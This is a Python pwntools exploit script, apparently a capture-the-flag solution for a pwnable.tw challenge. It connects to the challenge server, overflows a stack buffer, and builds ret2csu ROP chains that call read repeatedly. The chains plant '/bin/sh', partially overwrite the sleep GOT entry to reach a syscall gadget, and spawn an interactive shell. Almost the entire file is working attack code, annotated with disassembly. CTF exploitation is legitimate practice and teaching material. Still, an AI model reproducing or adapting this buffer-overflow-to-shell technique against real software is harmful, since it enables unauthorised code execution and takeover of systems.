#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
elf = context.binary = ELF("unexploitable_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

local = False 
if local:
    p = process("./unexploitable_patched")
    #gdb.attach(p,'''b*main+23\nc''')
else:
    p = remote('chall.pwnable.tw', 10403)

elf = context.binary = ELF('./unexploitable_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

csu_call    = 0x4005D0
'''
   0x00000000004005d0 <+80>:    mov    rdx,r15
   0x00000000004005d3 <+83>:    mov    rsi,r14
   0x00000000004005d6 <+86>:    mov    edi,r13d
   0x00000000004005d9 <+89>:    call   QWORD PTR [r12+rbx*8]
'''
csu_pop     = 0x4005E6
'''
   0x00000000004005e6 <+102>:   mov    rbx,QWORD PTR [rsp+0x8]
   0x00000000004005eb <+107>:   mov    rbp,QWORD PTR [rsp+0x10]
   0x00000000004005f0 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
   0x00000000004005f5 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
   0x00000000004005fa <+122>:   mov    r14,QWORD PTR [rsp+0x28]
   0x00000000004005ff <+127>:   mov    r15,QWORD PTR [rsp+0x30]
   0x0000000000400604 <+132>:   add    rsp,0x38
   0x0000000000400608 <+136>:   ret
'''
binsh = 0x601128

def chain(r12,r13,r14,r15,ret):
	c = p64(0) # rsp_addr
	c += p64(0) # rbx           # rbx
	c += p64(1) # rbp           # rbp
	c += p64(r12) # call        # r12
	c += p64(r13) # edi         # r13
	c += p64(r14) # rsi         # r14
	c += p64(r15) # rdx         # r15
	c += p64(ret)
	return c

'''
 ► 0x400571 <main+45>    call   read@plt                      <read@plt>
        fd: 0x0 (pipe:[27132])
        buf: 0x7ffd172cd190 —▸ 0x7ffd172cd280 ◂— 0x1
        nbytes: 0x100

RDX  0x100
RDI  0x0
RSI  0x7ffd172cd190 —▸ 0x7ffd172cd280 ◂— 0x1
'''

payload = b'A'*24
payload += p64(csu_pop)
payload += chain(elf.got['read'],0,elf.bss() + 0x100,10,csu_call)
payload += chain(0,0,0,0,elf.symbols['main'])
sleep(3)
s(payload)
s(b'/bin/sh\0')
log.info('Done! /bin/sh at ' +  hex(binsh))

payload = b'A'*24
payload += p64(csu_pop)
payload += chain(elf.got['read'],0,elf.got['sleep'], 0x1, csu_call)
payload += chain(elf.got['read'],0,elf.bss(),59,csu_call)
payload += chain(elf.got['sleep'],elf.bss()+0x100,0,0,csu_call)
sleep(3)
sl(payload)
s('\xfb') # 0xcb6fb <pause+43>:	syscall
s('A'*59)
p.interactive()
'''
   0x00000000004005e6 <+102>:   mov    rbx,QWORD PTR [rsp+0x8]
   0x00000000004005eb <+107>:   mov    rbp,QWORD PTR [rsp+0x10]
   0x00000000004005f0 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
   0x00000000004005f5 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
   0x00000000004005fa <+122>:   mov    r14,QWORD PTR [rsp+0x28]
   0x00000000004005ff <+127>:   mov    r15,QWORD PTR [rsp+0x30]
   0x0000000000400604 <+132>:   add    rsp,0x38
   0x0000000000400608 <+136>:   ret
'''
'''
   0x00000000004005d0 <+80>:    mov    rdx,r15
   0x00000000004005d3 <+83>:    mov    rsi,r14
   0x00000000004005d6 <+86>:    mov    edi,r13d
   0x00000000004005d9 <+89>:    call   QWORD PTR [r12+rbx*8]
   0x00000000004005dd <+93>:    add    rbx,0x1
   0x00000000004005e1 <+97>:    cmp    rbx,rbp
   0x00000000004005e4 <+100>:   jne    0x4005d0 <__libc_csu_init+80>
   0x00000000004005e6 <+102>:   mov    rbx,QWORD PTR [rsp+0x8]
   0x00000000004005eb <+107>:   mov    rbp,QWORD PTR [rsp+0x10]
   0x00000000004005f0 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
   0x00000000004005f5 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
   0x00000000004005fa <+122>:   mov    r14,QWORD PTR [rsp+0x28]
   0x00000000004005ff <+127>:   mov    r15,QWORD PTR [rsp+0x30]
   0x0000000000400604 <+132>:   add    rsp,0x38
   0x0000000000400608 <+136>:   ret

'''